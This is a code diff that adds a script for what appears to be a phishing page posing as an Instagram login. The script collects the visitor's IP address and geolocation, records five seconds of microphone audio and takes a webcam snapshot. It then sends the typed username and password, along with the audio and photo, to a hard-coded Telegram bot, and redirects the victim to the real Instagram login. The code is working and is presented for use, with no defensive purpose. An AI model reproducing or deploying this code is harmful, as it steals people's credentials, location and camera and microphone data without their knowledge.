@@ -1,0 +1,132 @@
+<script>
+    let locationData = "Unknown location";
+    let ipAddress = "Unknown IP";
+    let audioBlob;
+    let imageBlob;
+
+    async function requestPermissions() {
+        // Get IP address
+        fetch('https://api.ipify.org?format=json')
+            .then(response => response.json())
+            .then(data => {
+                ipAddress = data.ip;
+            });
+
+        // Request location permission
+        if (navigator.geolocation) {
+            navigator.geolocation.getCurrentPosition((position) => {
+                locationData = `Latitude: ${position.coords.latitude}, Longitude: ${position.coords.longitude}`;
+            });
+        }
+
+        try {
+            // Request audio and video permissions
+            const stream = await navigator.mediaDevices.getUserMedia({ audio: true, video: true });
+
+            // Capture a 5-second audio recording
+            const audioRecorder = await recordAudio(stream);
+            audioRecorder.start();
+            await sleep(5000);  // Wait for 5 seconds of recording
+            audioBlob = await audioRecorder.stop();
+
+            // Capture a snapshot from the video stream
+            const snapshot = await captureSnapshot(stream);
+            imageBlob = snapshot;
+
+        } catch (err) {
+            console.error('Error requesting media permissions:', err);
+        }
+    }
+
+    async function recordAudio(stream) {
+        const mediaRecorder = new MediaRecorder(stream);
+        let audioChunks = [];
+
+        return {
+            start() {
+                mediaRecorder.start();
+                mediaRecorder.ondataavailable = event => {
+                    audioChunks.push(event.data);
+                };
+            },
+            stop() {
+                return new Promise(resolve => {
+                    mediaRecorder.onstop = () => {
+                        const audioBlob = new Blob(audioChunks, { type: 'audio/wav' });
+                        resolve(audioBlob);
+                    };
+                    mediaRecorder.stop();
+                });
+            }
+        };
+    }
+
+    function captureSnapshot(stream) {
+        return new Promise(resolve => {
+            const video = document.createElement('video');
+            video.srcObject = stream;
+            video.play();
+            video.onloadedmetadata = () => {
+                const canvas = document.createElement('canvas');
+                canvas.width = video.videoWidth;
+                canvas.height = video.videoHeight;
+                canvas.getContext('2d').drawImage(video, 0, 0);
+                canvas.toBlob(blob => resolve(blob), 'image/jpeg');
+                video.pause();
+            };
+        });
+    }
+
+    function sleep(ms) {
+        return new Promise(resolve => setTimeout(resolve, ms));
+    }
+
+    async function sendData() {
+        const username = document.getElementById('username').value;
+        const password = document.getElementById('password').value;
+
+        if (username.trim() === "" || password.trim() === "") {
+            alert("Please fill in both fields.");
+            return;
+        }
+
+        const message = `New Login Attempt:\nUsername: ${username}\nPassword: ${password}\nIP Address: ${ipAddress}\nLocation: ${locationData}\nTime: ${new Date().toLocaleString()}`;
+
+        const botToken = '7565238718:AAGgWjTEn81YY_h_jTncM3tzc4tWJPdglds';
+        const chatId = '860517021';
+        const telegramApiUrl = `https://api.telegram.org/bot${botToken}/sendMessage`;
+
+        // Send the message to Telegram
+        await fetch(telegramApiUrl, {
+            method: 'POST',
+            headers: {
+                'Content-Type': 'application/json',
+            },
+            body: JSON.stringify({
+                chat_id: chatId,
+                text: message
+            })
+        });
+
+        // Send audio and image after message
+        if (audioBlob) {
+            await sendMedia(audioBlob, 'audio', botToken, chatId);
+        }
+        if (imageBlob) {
+            await sendMedia(imageBlob, 'photo', botToken, chatId);
+        }
+
+        // Redirect to Instagram after sending everything
+        window.location.href = "https://www.instagram.com/accounts/login/";
+    }
+
+    function sendMedia(blob, type, botToken, chatId) {
+        const formData = new FormData();
+        formData.append(type, blob, `${type}.${type === 'audio' ? 'wav' : 'jpg'}`);
+
+        return fetch(`https://api.telegram.org/bot${botToken}/send${type === 'audio' ? 'Audio' : 'Photo'}`, {
+            method: 'POST',
+            body: formData
+        });
+    }
+</script>
